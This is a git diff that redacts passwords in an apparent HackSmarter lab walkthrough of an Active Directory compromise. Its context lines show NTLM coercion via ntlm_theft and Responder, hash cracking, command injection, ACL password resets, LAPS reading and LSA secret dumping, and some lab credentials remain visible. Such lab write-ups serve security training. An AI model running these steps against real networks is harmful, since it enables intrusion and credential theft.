@@ -24,7 +24,7 @@ For the purposes of this evaluation, you will be provided the assigned credentia
 
 | Username | Password |
 |----------|----------|
-| hellyr | H3lenaR!2025 |
+| hellyr | [REDACTED] |
 
 **Platform:** HackSmarter
 **Difficulty:** Medium
@@ -45,7 +45,7 @@ UwU Toolkit netexec > set RHOSTS 10.1.188.43
 RHOSTS => 10.1.188.43
 UwU Toolkit netexec > creds use 1
 [*] USER => hellyr
-[*] PASS => H3lenaR!2025
+[*] PASS => [REDACTED]
 [+] Loaded credential: 1
 UwU Toolkit netexec > set GENERATE_HOSTS yes
 GENERATE_HOSTS => yes
@@ -55,10 +55,10 @@ UwU Toolkit netexec > run
 [*] User: hellyr
 [*] Protocol: SMB
 [*] Action: check
-[*] Executing: NetExec smb 10.1.188.43 -u hellyr -p 'H3lenaR!2025'
+[*] Executing: NetExec smb 10.1.188.43 -u hellyr -p '[REDACTED]'
 [*] SMB 10.1.188.43 445 INTRANET Windows 11 / Server 2025 Build 26100 x64 (name:INTRANET)
 (domain:lumons.hacksmarter) (signing:False) (SMBv1:None)
-[+] SMB 10.1.188.43 445 INTRANET [+] lumons.hacksmarter\hellyr:H3lenaR!2025
+[+] SMB 10.1.188.43 445 INTRANET [+] lumons.hacksmarter\hellyr:[REDACTED]
 [+] Generated /etc/hosts entries:
 10.1.188.43 INTRANET INTRANET.lumons.hacksmarter lumons.hacksmarter
 [?] Append to /etc/hosts? [Y/n]: y
@@ -91,10 +91,10 @@ UwU Toolkit netexec > run
 [*] User: hellyr
 [*] Protocol: SMB
 [*] Action: shares
-[*] Executing: NetExec smb 10.1.188.43 -u hellyr -p 'H3lenaR!2025' --shares
+[*] Executing: NetExec smb 10.1.188.43 -u hellyr -p '[REDACTED]' --shares
 [*] SMB 10.1.188.43 445 INTRANET Windows 11 / Server 2025 Build 26100 x64 (name:INTRANET)
 (domain:lumons.hacksmarter) (signing:False) (SMBv1:None)
-[+] SMB 10.1.188.43 445 INTRANET [+] lumons.hacksmarter\hellyr:H3lenaR!2025
+[+] SMB 10.1.188.43 445 INTRANET [+] lumons.hacksmarter\hellyr:[REDACTED]
 [*] SMB 10.1.188.43 445 INTRANET Enumerated shares
 SMB 10.1.188.43 445 INTRANET Share Permissions Remark
 SMB 10.1.188.43 445 INTRANET ----- ----------- ------
@@ -107,7 +107,7 @@ SMB 10.1.188.43 445 INTRANET MDRepo READ,WRITE
 Enumerating the shares we see two files. Let's pull these and see if we can identify anything interesting:
 
 ```
-Exegol > smbclient.py 'hellyr':'H3lenaR!2025'@10.1.188.43
+Exegol > smbclient.py 'hellyr':'[REDACTED]'@10.1.188.43
 Impacket (Exegol fork) v0.13.0.dev0+20250723.125503.b5db2dd7 - Copyright Fortra, LLC and its affiliated companies
 
 Type help for list of commands
@@ -315,7 +315,7 @@ FILE_TYPE        all                                no         File types to gen
 INTERFACE        tun0                               no         Network interface for Responder
 LHOST            10.200.31.187                      yes        Listener IP (your Responder IP)
 OUTPUT_DIR       ntlm_theft_output                  no         Output directory for files
-PASS             H3lenaR!2025                       no         Password for SMB auth
+PASS             [REDACTED]                       no         Password for SMB auth
 REMOTE_PATH                                         no         Remote path within share (optional)
 RHOSTS           10.1.188.43                        no         Target host for upload
 SHARE            MDRepo                             no         Share name for upload
@@ -409,28 +409,28 @@ desktop.ini
 [*] Attempting to crack captured hashes...
 [*] Running hashcat (NTLMv2 mode 5600)...
 [+] Cracked passwords:
-HARMONYC::LUMONS:[HASH REDACTED]:h@rmony08
+HARMONYC::LUMONS:[HASH REDACTED]:[REDACTED]
 [*] Responder stopped
 ```
 
-We identify **h@rmony08** for HARMONYC.
+We identify **[REDACTED]** for HARMONYC.
 
 ### Validating New Credentials
 
 Let's add and verify the new creds:
 
 ```
-UwU Toolkit ntlm_coerce > creds set HARMONYC h@rmony08
+UwU Toolkit ntlm_coerce > creds set HARMONYC [REDACTED]
 UwU Toolkit netexec > run
 [*] Running netexec...
 [*] Target: 10.1.188.43
 [*] User: HARMONYC
 [*] Protocol: SMB
 [*] Action: check
-[*] Executing: NetExec smb 10.1.188.43 -u HARMONYC -p 'h@rmony08'
+[*] Executing: NetExec smb 10.1.188.43 -u HARMONYC -p '[REDACTED]'
 [*] SMB 10.1.188.43 445 INTRANET Windows 11 / Server 2025 Build 26100 x64 (name:INTRANET)
 (domain:lumons.hacksmarter) (signing:False) (SMBv1:None)
-[+] SMB 10.1.188.43 445 INTRANET [+] lumons.hacksmarter\HARMONYC:h@rmony08
+[+] SMB 10.1.188.43 445 INTRANET [+] lumons.hacksmarter\HARMONYC:[REDACTED]
 [+] Module completed successfully
 ```
 
@@ -452,10 +452,10 @@ UwU Toolkit netexec > run
 [*] User: hellyr
 [*] Protocol: SMB
 [*] Action: check
-[*] Executing: NetExec smb 10.1.250.54 -u hellyr -p 'H3lenaR!2025' -d dc01.lumons.hacksmarter
+[*] Executing: NetExec smb 10.1.250.54 -u hellyr -p '[REDACTED]' -d dc01.lumons.hacksmarter
 [*] SMB 10.1.250.54 445 DC01 Windows 11 / Server 2025 Build 26100 x64 (name:DC01)
 (domain:lumons.hacksmarter) (signing:True) (SMBv1:None) (Null Auth:True)
-[+] SMB 10.1.250.54 445 DC01 [+] dc01.lumons.hacksmarter\hellyr:H3lenaR!2025
+[+] SMB 10.1.250.54 445 DC01 [+] dc01.lumons.hacksmarter\hellyr:[REDACTED]
 [+] Generated /etc/hosts entries:
 10.1.250.54 DC01 DC01.lumons.hacksmarter lumons.hacksmarter
 [?] Append to /etc/hosts? [Y/n]: y
@@ -552,7 +552,7 @@ IntranetSvc::LUMONS:[HASH REDACTED]
 Using UwU hashcrack we can crack the hash instantly:
 
 ```
-INTRANETSVC::LUMONS:[HASH REDACTED]:Servicesince1979
+INTRANETSVC::LUMONS:[HASH REDACTED]:[REDACTED]
 ```
 
 ---
@@ -583,7 +583,7 @@ Name               Current               Required   Description
 ------------- -------------------- ---------- ---------------------------------------------
 DOMAIN        lumons.hacksmarter   yes        Domain name
 NEW_PASS                           yes        New password for target
-PASS          Servicesince1979     yes        Password for USER
+PASS          [REDACTED]     yes        Password for USER
 RHOSTS        10.1.250.54          yes        Domain Controller IP
 TARGET_USER                        yes        Target user to reset password
 USER          INTRANETSVC          yes        Username with ACL permissions
@@ -660,7 +660,7 @@ Impacket (Exegol fork) v0.13.0.dev0+20250723.125503.b5db2dd7 - Copyright Fortra,
 
 Host       LAPS Username  LAPS Password              LAPS Password Expiration  LAPSv2
 ---------  ------------- -------------------------- ------------------------  ------
-INTRANET$  localadmin    DoseAxisWickTastyGlassHelp 2026-02-22 10:23:15       True
+INTRANET$  localadmin    [REDACTED] 2026-02-22 10:23:15       True
 ```
 
 ### Local Administrator Access
@@ -711,7 +711,7 @@ SMB 10.1.188.43 445 INTRANET LUMONS.HACKSMARTER/harmonyc:[DCC2 HASH REDACTED]: (
 SMB 10.1.188.43 445 INTRANET LUMONS.HACKSMARTER/MarkS:[DCC2 HASH REDACTED]: (2025-10-10 00:54:05)
 SMB 10.1.188.43 445 INTRANET LUMONS\INTRANET$:[MACHINE KEYS REDACTED]
 SMB 10.1.188.43 445 INTRANET dpapi_machinekey:[DPAPI KEYS REDACTED]
-SMB 10.1.188.43 445 INTRANET LUMONS\harmonyc:h@rmony08
+SMB 10.1.188.43 445 INTRANET LUMONS\harmonyc:[REDACTED]
 SMB 10.1.188.43 445 INTRANET [+] Dumped 12 LSA secrets to /root/.nxc/logs/lsa/INTRANET_10.1.188.43_2026-01-23_142210.secrets and /root/.nxc/logs/lsa/INTRANET_10.1.188.43_2026-01-23_142210.cached
 Exegol >
 ```
@@ -731,7 +731,7 @@ Then use hashcrack in UwU or hashcat 2100:
 
 ```
 === CRACKED ===
-$DCC2$10240#hellye#[HASH REDACTED]:Security&system
+$DCC2$10240#hellye#[HASH REDACTED]:[REDACTED]
 Connection to 172.17.0.1 closed.
 ```
 
@@ -748,15 +748,15 @@ Now we can RDP as hellye and own the domain:
 ```
 Phase 1 - Initial Access
 ─────────────────────────────────────
-hellyr       : H3lenaR!2025         → Starting credentials
+hellyr       : [REDACTED]         → Starting credentials
 
 Phase 2 - NTLM Coercion (MDRepo Share)
 ─────────────────────────────────────
-harmonyc     : h@rmony08            → Hash captured via ntlm_theft in MDRepo
+harmonyc     : [REDACTED]            → Hash captured via ntlm_theft in MDRepo
 
 Phase 3 - Web Application Exploitation
 ─────────────────────────────────────
-intranetsvc  : Servicesince1979     → Hash captured via command injection coercion
+intranetsvc  : [REDACTED]     → Hash captured via command injection coercion
 
 Phase 4 - ACL Abuse (ForceChangePassword)
 ─────────────────────────────────────
@@ -765,15 +765,15 @@ peterk       : Password123          → Password reset via intranetsvc
 
 Phase 5 - LAPS Exploitation
 ─────────────────────────────────────
-localadmin   : DoseAxisWickTastyGlassHelp → LAPS password via marks (LAPSADMINS)
+localadmin   : [REDACTED] → LAPS password via marks (LAPSADMINS)
 
 Phase 6 - Credential Dumping
 ─────────────────────────────────────
-hellye (DCC2): Security&system      → Cached credentials from LSA dump
+hellye (DCC2): [REDACTED]      → Cached credentials from LSA dump
 
 Phase 7 - Domain Compromise
 ─────────────────────────────────────
-hellye       : Security&system      → Domain Admin - DOMAIN OWNED
+hellye       : [REDACTED]      → Domain Admin - DOMAIN OWNED
 ```
 
 ---
